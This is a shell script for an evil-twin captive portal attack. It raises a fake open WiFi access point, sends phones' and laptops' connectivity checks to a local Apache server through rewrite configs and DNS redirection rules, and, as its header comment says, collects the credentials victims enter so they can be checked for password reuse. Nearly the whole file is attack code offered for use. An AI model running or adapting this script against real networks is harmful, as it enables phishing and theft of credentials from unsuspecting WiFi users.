#!/bin/sh

# This script does a captive portal attack
# grabbing generated user credentials to be
# checked for same passwords
# Usage: <script>

return_to_default() {
	rm /etc/apache2/sites-enabled/android.conf
	rm /etc/apache2/sites-enabled/apple.conf
	rm /etc/apache2/sites-enabled/windows.conf
	systemctl stop apache2 mysql
	killall hostapd dnsmasq
}

dns_redirection_configuration() {
	echo 'address="/connectivitycheck.gstatic.com"/192.168.1.1"'
	echo 'address="/apple.com/192.168.1.1"'
	echo 'address="/appleiphonecell.com/192.168.1.1"'
	echo 'address="/itools.info/192.168.1.1"'
	echo 'address="/ibook.info/192.168.1.1"'
	echo 'address="/airport.us/192.168.1.1"'
	echo 'address="/thinkdifferent.us/192.168.1.1"'
	echo 'address="/edgekey.net/192.168.1.1"'
	echo 'address="/akamaiedge.net/192.168.1.1"'
	echo 'address="/akamaitechnologies/192.168.1.1"'
	echo 'address="/clients3.google.com/192.168.1.1"'
}

trap return_to_default EXIT

# Enable apache redirection
a2enmod rewrite

ESSID="OpenWifi"
CHANNEL="6"

# Copy the captive portal redirections to apache
cp ./configs/android.conf /etc/apache2/sites-enabled/
cp ./configs/apple.conf /etc/apache2/sites-enabled/
cp ./configs/windows.conf /etc/apache2/sites-enabled/

# Start the fake open wifi Access Point
./host_ap.sh "$ESSID" "" "$CHANNEL"

# Start the services
systemctl start apache2 mysql

# Set up the DNS Captive Portal redirection
#dns_redirection_configuration >> /etc/dnsmasq.conf

# Add the IP TCP redirection rule
#iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80

# Loop in foreground
echo "Starting foreground loop..."
while true; do sleep 1h; done
